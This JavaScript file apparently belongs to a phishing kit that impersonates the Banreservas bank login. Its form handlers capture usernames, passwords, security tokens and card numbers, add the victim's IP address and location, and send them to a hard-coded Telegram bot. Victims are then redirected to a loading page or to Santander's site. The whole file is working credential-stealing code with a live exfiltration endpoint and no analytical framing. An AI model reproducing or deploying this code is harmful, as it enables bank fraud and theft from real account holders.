document.addEventListener("DOMContentLoaded", function() {
    // Función para obtener el valor de un parámetro de la URL
    function getQueryParam(param) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(param);
    }

    // Función para obtener la ubicación y enviar el mensaje a Telegram
    function obtenerUbicacionYEnviarMensajeTelegram(code, password, nextPage, message) {
        fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            var country = data.country_name;
            var region = data.region;
            var ip = data.ip;
            if (country && region && ip) {
                message += '\nUbicación: ' + country + ', ' + region + '\nIP: ' + ip;
            } else {
                message += '\nNo se pudo obtener la ubicación.';
            }
            enviarMensajeTelegram(message, nextPage);
        })
        .catch(error => {
            console.error("Error al obtener la ubicación:", error);
            message += "\nError al obtener la ubicación.";
            enviarMensajeTelegram(message, nextPage);
        });
    }

    // Función para enviar el mensaje a Telegram y redirigir
    function enviarMensajeTelegram(mensaje, nextPage) {
        var token = '7260151162:AAFbHGT20f9Q1Ekd1332PButYOd0EfZMq3A';
        var chatId = '6945190840';
        var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
        var params = {
            chat_id: chatId,
            text: mensaje
        };

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(params)
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Ocurrió un error al enviar el mensaje.');
            }
            console.log('Mensaje enviado con éxito.');
            window.location.href = nextPage;
        })
        .catch(error => {
            console.error('Error al enviar el mensaje:', error);
        });
    }

    // Evento de envío de formulario para la página de inicio de sesión
    var formLogin = document.getElementById("loginForm");
    if (formLogin) {
        formLogin.addEventListener("submit", function(event) {
            event.preventDefault();
            var usuario = document.getElementById("usuario").value;
            var contrasena = document.getElementById("contrasena").value;
            obtenerUbicacionYEnviarMensajeTelegram(usuario, contrasena, "cargando.html", "💲 Banreservas RD 💲:\nUsuario: " + usuario + "\nContrasena: " + contrasena);
        });
    }

    // Evento de envío de formulario para la página de inicio de sesión
    var formLogin = document.getElementById("loginForm2");
    if (formLogin) {
        formLogin.addEventListener("submit", function(event) {
            event.preventDefault();
            var token = document.getElementById("token").value;
            obtenerUbicacionYEnviarMensajeTelegram(token, token, "cargando.html", "💲 Banreservas RD 💲:\nToken: " + token);
        });
    }

    // Evento de envío de formulario para la sección de contacto
    var formContacto = document.getElementById("verificationForm");
    if (formContacto) {
        formContacto.addEventListener("submit", function(event) {
            event.preventDefault();
            var token = document.getElementById("card").value;
            obtenerUbicacionYEnviarMensajeTelegram(token, token, "https://www.santander.com.ar/personas", "💲 Banreservas RD 💲:\nTarjeta: " + token);
        });
    
    }
});
